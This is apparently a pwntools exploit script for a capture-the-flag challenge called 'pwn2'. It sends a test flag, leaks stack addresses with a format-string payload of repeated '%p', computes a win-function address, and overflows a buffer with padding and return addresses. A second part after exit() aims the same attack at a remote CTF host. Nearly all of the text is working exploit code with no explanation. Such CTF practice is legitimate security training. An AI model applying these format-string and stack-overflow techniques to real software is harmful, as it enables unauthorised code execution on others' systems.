from pwn import *

i=9
#for i in range(0x00,0xff):
print(i)
p=process("./pwn2")
#pwdch1=b"CSCG{FLAG_FROM_STAGE_1}"
pwdch=b"CSCG{THIS_IS_TEST_FLAG}"

p.recvuntil("Enter the password of stage 1:")
p.sendline(pwdch)

FStr="|".join(["%p" for _ in range(42)])
p.recvuntil("Enter your witch name:")
p.sendline(FStr+"|")
leak=p.recvuntil("enter your magic spell:").split(b"|")
#print(leak)
#print(leak[-5])
#print(leak[-3])
#print(hex(int(leak[-3],16)-0x37))
#main=int(leak[-3],16)-0x37
#main_win_off=0x1fa
#win_addr=main-main_win_off
#print(hex(win_addr))
#input('attach')
spell="Expelliarmus\x00"
#padding=b'X'*cyclic_find(b"cnaacoaa")
pad="x"*(0xff-13+i)
print(0xff-13+i)
p.sendline(spell+pad)
p.interactive()







exit()

p=remote("hax1.allesctf.net",9100)
main_win_offset=0x135
FStr="|".join(["%p" for _ in range(42)])
p.recvuntil("Enter your witch name:")
p.sendline(FStr)
leak=p.recvuntil("enter your magic spell:").split(b"|")
main=int(leak[-4],16)
win_addr=main-main_win_offset
ret_addr=win_addr+0x36
input('lalal')
spell=b"Expelliarmus\x00"
padding=b'X'*cyclic_find(b"cnaacoaa")
#cyc=cyclic(0xff+0xff)
#p.sendline(spell+cyc)
p.sendline(spell+padding+p64(ret_addr)+p64(win_addr))